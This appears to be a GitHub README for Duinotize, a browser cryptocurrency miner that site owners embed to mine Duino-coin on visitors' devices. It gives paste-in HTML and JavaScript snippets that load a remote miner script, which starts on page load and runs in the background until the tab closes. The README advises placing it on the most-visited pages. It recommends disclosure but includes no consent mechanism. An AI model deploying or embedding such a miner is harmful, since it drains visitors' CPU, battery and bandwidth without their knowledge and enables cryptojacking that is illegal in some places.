# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Don't want to leak personal info to use Adsense? Use **Duinotize**! It's a fork of the official Duino-coin web miner designed to be easily integrated into any website, to generate passive income just from people visiting your website.

## Installation
Put the following code at the very bottom of the HTML page(s) you want the miner to run on:
```
<script src="https://mobilegmyt.github.io/Duinotize/duinotize.js" defer></script>
<div id="duinotize-config" username="chunkymilk0309" alias="duinotize-rig"></div>
```
Make sure to replace `chunkymilk0309` with your username and `duinotize-rig` with the name you want miners to show up as in the web wallet.

<details><summary>Optional configs</summary>
These are configurations you can change if you wish, but the script will run fine if you don't use them
- `difficulty` variable with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (LOW is the default, as MEDIUM or EXTREME causes frequent socket disconnects and may get your account banned!)
- `threads` variable, to choose how many threads the miner uses. Anything over 1 could cause lag on some devices, and even prevent the website from loading on them
- `hasher` variable, to choose which hasher to use. You can choose `DUCO-S1` or `hashwasm`. `hashwasm` has a extremely low hashrate on some devices, but a very high hashrate on others. `DUCO-S1` is the default hasher.

For example, a custom config might look like this:
```
<script src="https://mobilegmyt.github.io/Duinotize/duinotize.js" defer></script>
<div id="duinotize-config" username="chunkymilk0309" alias="GameSite" difficulty="LOW" threads="2" hasher="hashwasm" ></div>
```
</details>

<details><summary>JS installation</summary>

Some people might want to trigger the miner with JS instead of HTML (eg if you want to run the miner upon a button click like in the demo below), so here's a simple example:

```
// Configs
let username = "chunkymilk0309";
let rigid = "duinotize-rig";
let threads = 1;
let difficulty = "LOW";
let hasher = "DUCO-S1";

// DO NOT EDIT ANYTHING BELOW THIS LINE
let wallet_id = Math.floor(Math.random() * 2811);
let workerVer = 0;
for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
    var socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/main.js");
    socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
    workerVer++;
}
```
Documentation for the configs to change are above, you should only change the variables in the top section of the code. The code simply bypasses the wrapper for the HTML installation.
</details>

Now, whenever that page is opened, the miner will start and output messages to the developer console. It will run until the tab (not just the page) is closed. Make sure to install the miner on a page where users visit the most, so that there are more miners running. You can see this in action at https://mobilegmyt.github.io/Duinotize/demo/, or look [here](https://github.com/mobilegmYT/Duinotize/blob/main/demo/index.html) for the source code to that page for a example of how to implement it.

I HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background (in some places it is illegal to mine crypto in the background without consent!), and optionally credit this repo.

## How it works
The program runs a wrapper, which parses the input and runs a worker that connects to the Duco server via a websocket, requests a mining job with the configured settings and solves it using either [DUCO-S1](https://github.com/mobilegmYT/Duinotize/blob/main/hashes.js) or [hash-wasm](https://github.com/Daninet/hash-wasm).The miner sends the result, the time it took, username and hashrate to the server which loads it onto your wallet.